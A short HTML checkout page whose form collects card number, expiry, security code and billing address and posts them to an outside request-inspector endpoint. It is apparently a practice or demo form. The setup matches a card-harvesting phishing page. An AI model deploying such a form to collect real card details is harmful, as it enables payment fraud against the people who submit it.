<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Checkout</title>
</head>
<body>
    <h1><em>CHECKOUT</em></h1>
        <form method="POST" action="https://request-inspector.glitch.me/">
            Credit Card Number  <input type="password" id="password" name="password" required>
            <br>
            <br>
            Expiration  <input type="month" id="expdte" name="expdte" required>
            <br>
            <br>
            Security Code  <input type="number" placeholder="###" id="seccode" name="seccode" required>
            <br>
            <br>
            Billing Address  <input type="text" id="add" name="add" required>
            State <select name="State" required>
            <option value="Texas">Texas</option>
            <option value="Virginia">Virginia</option>
            </select>
            Zip Code <input type="number" id="zip" name="zip" required>
            <br>
            <br>
            <input type="checkbox"checked>  Keep this card on file for future purchases!
            <br>
            <br>
            <button>BUY NOW!</button>

</body>
</html>
